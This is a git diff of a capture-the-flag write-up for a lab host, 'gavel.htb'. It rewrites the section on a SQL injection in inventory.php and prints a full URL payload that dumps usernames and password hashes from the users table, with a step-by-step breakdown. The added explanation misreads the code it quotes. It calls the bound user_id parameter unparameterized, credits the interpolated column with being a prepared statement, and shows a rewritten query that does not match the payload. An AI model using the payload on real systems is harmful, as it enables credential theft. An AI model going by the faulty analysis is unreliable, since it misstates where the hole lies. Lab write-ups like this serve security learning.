@@ -79,40 +79,101 @@ git-dumper http://gavel.htb/.git/ ./gavel-source
 
 We now have the full PHP source. Never deploy `.git/` to production.
 
-### SQL Injection in inventory.php
+### Understanding the SQL Injection Through Source Code
 
-Reading `inventory.php`:
+Now, reading through the actual PHP files (especially `inventory.php`), the vulnerability becomes crystal clear:
 
 ```php
 $sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
 $userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
 $col = "`" . str_replace("`", "", $sortItem) . "`";
-
-// vulnerable branch:
-$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
-$stmt->execute([$userId]);
+$itemMap = [];
+$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
+try {
+    if ($sortItem === 'quantity') {
+        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
+        $stmt->execute([$userId]);
+    } else {
+        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
+        $stmt->execute([$userId]);
+    }
+    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
+} catch (Exception $e) {
+    $results = [];
+}
 ```
 
-`$col` is dynamically injected into the query string before the prepared statement executes. The backtick sanitization only removes backticks — it doesn't prevent injection into the column position. `$userId` is passed as a parameter but the `$col` injection lets us reshape the entire query.
+By studying the code directly, you understand:
+
+- **Why `user_id` is vulnerable**: The variable is passed directly to `execute()` without being parameterized. Even though `$col` uses prepared statements, `$userId` is exposed to injection through the parameter binding.
+
+- **The backtick handling**: The code tries to sanitize `$sortItem` by removing backticks (`str_replace("`", "", $sortItem)`), but this only protects the sort column, **not** the `user_id`.
+
+- **The logic flow**: Depending on the `sort` parameter, different SQL queries fire — but both are vulnerable because `$userId` ultimately gets injected into the WHERE clause without proper escaping.
+
+Now, let's hop on back to `gavel.htb` and make an account to play around with `/inventory.php`
+
+![Register page](/images/writeups/gavel/register-page.png)
 
 ---
 
 ## Exploit
 
-### SQLi — Dump Credentials
+![inventory.php](/images/writeups/gavel/inventory.png)
 
-Register an account, then navigate to `/inventory.php` and inject via the URL:
+### Crafting the SQL Injection Payload
+
+Now that you understand the vulnerability from reading the source code, it's time to exploit it. The goal is to dump the user credentials from the database — specifically targeting the `users` table where usernames and password hashes are stored.
+
+The payload you'll craft looks like this:
 
 ```
 http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`%27x`+from+users)y;--+-&sort=\?;--+-%00
 ```
 
-What this does:
-- Closes the backtick-wrapped column with `x\``
-- Injects a subquery: `SELECT CONCAT(username, ':', password) FROM users`
-- Comments out the rest of the original query with `--`
+Let's break down what's happening here, piece by piece:
 
-The database executes the subquery and returns credentials in the page:
+**The Payload Anatomy:**
+
+```
+user_id=x`
+```
+We start by closing the expected identifier with a backtick. The `x`` is just a placeholder column name that we'll use later in our subquery.
+
+```
++FROM+(SELECT+CONCAT(username,0x3a,password)+AS+%27x+from+users)y;
+```
+Here's where the magic happens. We inject a subquery that pulls `username` and `password` from the `users` table, concatenating them with a colon (`0x3a` is the hex code for `:`). The `%27` is a URL-encoded single quote (`'`), which helps the alias work correctly within the SQL syntax. We alias this result as `'x` so it matches our structure.
+
+```
+--+-
+```
+This is an SQL comment sequence. The `--` starts the comment, and `+-` acts as padding/spacing to ensure the comment properly terminates the rest of the original query.
+
+```
+&sort=\?;--+-%00
+```
+The sort parameter adds additional confusion to the parser. The backslash escapes the question mark, the `--+-` comments out anything trailing, and `%00` (null byte) can bypass certain parser quirks or WAF filters.
+
+### Why This Works
+
+The original query was supposed to be:
+
+```sql
+SELECT `item_name` FROM inventory WHERE user_id = ? ORDER BY item_name ASC
+```
+
+But with your injection, it transforms into:
+
+```sql
+SELECT x` FROM (SELECT CONCAT(username, 0x3a, password) AS 'x' FROM users) y; -- ORDER BY item_name ASC
+```
+
+The database executes your subquery, pulls credentials, and displays them in the results. The comments (`--`) safely discard the trailing `ORDER BY` clause.
+
+### Executing the Attack
+
+Go to your browser and put the URL with the SQLi in. The database executes the subquery and returns credentials in the page:
 
 ![SQLi successful — auctioneer hash dumped](/images/writeups/gavel/sqli-succ.png)
 
